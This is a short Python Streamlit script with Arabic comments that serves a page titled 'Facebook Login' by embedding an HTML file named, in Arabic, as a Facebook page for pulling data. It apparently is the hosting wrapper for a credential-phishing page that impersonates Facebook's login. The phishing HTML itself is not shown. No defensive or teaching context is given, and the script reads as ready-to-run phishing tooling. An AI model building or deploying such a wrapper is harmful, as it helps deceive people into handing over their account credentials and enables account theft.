import streamlit as st
import streamlit.components.v1 as components

# 1. إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# 2. قراءة ملف الـ HTML
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        # قرأنا الكود في متغير اسمه code
        code = f.read()
    
    # 3. العرض (التصحيح: نضع المتغير code مباشرة كأول قيمة)
    components.html(code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ لم أجد ملف الـ HTML! تأكد من رفعه بنفس الاسم بالضبط بجانب ملف البايثون.")
